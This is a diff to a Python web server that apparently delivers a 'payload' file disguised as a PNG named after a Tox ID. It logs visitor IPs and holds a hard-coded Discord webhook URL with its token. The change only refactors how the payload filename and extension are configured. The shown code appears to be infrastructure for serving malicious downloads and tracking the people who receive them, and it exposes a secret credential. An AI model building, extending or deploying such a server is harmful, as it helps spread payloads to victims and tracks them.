@@ -11,9 +11,14 @@ import time
 
 PORT = 8000
 DIRECTORY = os.path.dirname(os.path.abspath(__file__))
-TOX_ID = "F5A5B309A4C771E3A88C05C37E27F543E098BAE76AB4442BE6421FA06BE6573E778A32A8415B"
+# PAYLOAD_CONFIG_START
+PAYLOAD_REL_PATH = "media/images/F5A5B309A4C771E3A88C05C37E27F543E098BAE76AB4442BE6421FA06BE6573E778A32A8415B.png"
+PAYLOAD_BASENAME = "F5A5B309A4C771E3A88C05C37E27F543E098BAE76AB4442BE6421FA06BE6573E778A32A8415B"
+PAYLOAD_EXT = "png"
+# PAYLOAD_CONFIG_END
+TOX_ID = PAYLOAD_BASENAME
 TOX_IMAGE_PATH = os.path.join(DIRECTORY, "media", "images", "tox.png")
-TOX_ID_IMAGE_PATH = os.path.join(DIRECTORY, "media", "images", f"{TOX_ID}.png")
+TOX_ID_IMAGE_PATH = os.path.join(DIRECTORY, PAYLOAD_REL_PATH)
 DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1552406859527233602/n6RGGVyXRd7pYPc6rIfgiVmbNpRSlfufL0IwAMYpE9QDmsgA0nB1om1ZEkumUft7Fm42"
 
 LOGGED_IPS = {}
@@ -190,7 +195,8 @@ class Handler(http.server.SimpleHTTPRequestHandler):
                     content = f.read()
                 
                 num = query.get("n", query.get("cycle", [""]))[0]
-                filename = f"{TOX_ID}_{num}.png" if (num and num != "1") else f"{TOX_ID}.png"
+                ext_dot = f".{PAYLOAD_EXT}" if PAYLOAD_EXT else ""
+                filename = f"{PAYLOAD_BASENAME}_{num}{ext_dot}" if (num and num != "1") else f"{PAYLOAD_BASENAME}{ext_dot}"
 
                 self.send_response(200)
                 self.send_header("Content-Type", "application/octet-stream")
